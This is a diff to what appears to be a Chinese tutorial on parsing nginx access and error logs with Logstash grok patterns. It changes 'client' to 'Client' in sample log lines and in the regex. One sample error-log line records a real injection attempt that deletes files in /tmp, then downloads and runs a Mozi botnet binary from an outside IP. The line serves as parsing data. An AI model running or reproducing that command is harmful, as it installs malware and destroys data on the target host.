@@ -75,13 +75,13 @@
 {"created_at":"2020-09-21T04:58:00+08:00","time_local":"21/Sep/2020:04:58:00 +0800","remote_addr":"192.241.221.22","method":"GET","request":"GET / HTTP/1.1","status":"200","size":199,"referer": "-","http_host":"49.232.145.118","response_time":0.000,"http_x_forwarded_for":"-","user_agent": "Mozilla/5.0 zgrab/0.x"}
 
 # nginx001_error.log 日志
-2020/09/21 00:57:00 [error] 6#0: *26 open() "/usr/local/nginx/html/elrekt.php" failed (2: No such file or directory), client: 106.52.153.48, server: localhost, request: "GET /elrekt.php HTTP/1.1", host: "49.232.145.118"
-2020/09/21 00:57:00 [error] 6#0: *27 open() "/usr/local/nginx/html/index.php" failed (2: No such file or directory), client: 106.52.153.48, server: localhost, request: "GET /index.php HTTP/1.1", host: "49.232.145.118"
-2020/09/21 01:50:50 [error] 6#0: *30 open() "/usr/local/nginx/html/shell" failed (2: No such file or directory), client: 123.96.229.15, server: localhost, request: "GET /shell?cd+/tmp;rm+-rf+*;wget+http://123.96.229.15:35278/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1", host: "49.232.145.118:80"
+2020/09/21 00:57:00 [error] 6#0: *26 open() "/usr/local/nginx/html/elrekt.php" failed (2: No such file or directory), Client: 106.52.153.48, server: localhost, request: "GET /elrekt.php HTTP/1.1", host: "49.232.145.118"
+2020/09/21 00:57:00 [error] 6#0: *27 open() "/usr/local/nginx/html/index.php" failed (2: No such file or directory), Client: 106.52.153.48, server: localhost, request: "GET /index.php HTTP/1.1", host: "49.232.145.118"
+2020/09/21 01:50:50 [error] 6#0: *30 open() "/usr/local/nginx/html/shell" failed (2: No such file or directory), Client: 123.96.229.15, server: localhost, request: "GET /shell?cd+/tmp;rm+-rf+*;wget+http://123.96.229.15:35278/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1", host: "49.232.145.118:80"
 # 可能还有其他的错误格式
 2018/07/09 16:50:34 [error] 78175#0: *21132 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/usr/local/jenkins_manage_project/2018/bestbox_first/public/index.php) is not within the allowed path(s): (/home/wwwroot/:/tmp/:/proc/) in Unknown on line 0
 PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
-Unable to open primary script: /usr/local/jenkins_manage_project/2018/bestbox_first/public/index.php (Operation not permitted)" while reading response header from upstream, client: 192.168.6.85, server: 192.168.8.62, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/tmp/php-cgi.sock:", host: "192.168.8.62"
+Unable to open primary script: /usr/local/jenkins_manage_project/2018/bestbox_first/public/index.php (Operation not permitted)" while reading response header from upstream, Client: 192.168.6.85, server: 192.168.8.62, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/tmp/php-cgi.sock:", host: "192.168.8.62"
 
 ```
 
@@ -237,7 +237,7 @@ filter {
       # 匹配 nginx 错误日志,将原始文本进行 json 化
    if [type]=="nginxerr" {      
       grok {
-           match => [ "message" , "(?<created_at>%{YEAR}[./-]%{MONTHNUM2}[./-]%{MONTHDAY} %{TIME:time2}) \[%{WORD:errLevel}]  (?<errMsg>([\w\W])*), client\: %{IP:clientIp}(, server\: %{IPORHOST:server})?(, request\: \"%{DATA:request}\")?(, upstream\: \"%{DATA:upstream}\")?(, host\: \"%{DATA:host}\")?"  ]
+           match => [ "message" , "(?<created_at>%{YEAR}[./-]%{MONTHNUM2}[./-]%{MONTHDAY} %{TIME:time2}) \[%{WORD:errLevel}]  (?<errMsg>([\w\W])*), Client\: %{IP:clientIp}(, server\: %{IPORHOST:server})?(, request\: \"%{DATA:request}\")?(, upstream\: \"%{DATA:upstream}\")?(, host\: \"%{DATA:host}\")?"  ]
         }	
    }
 
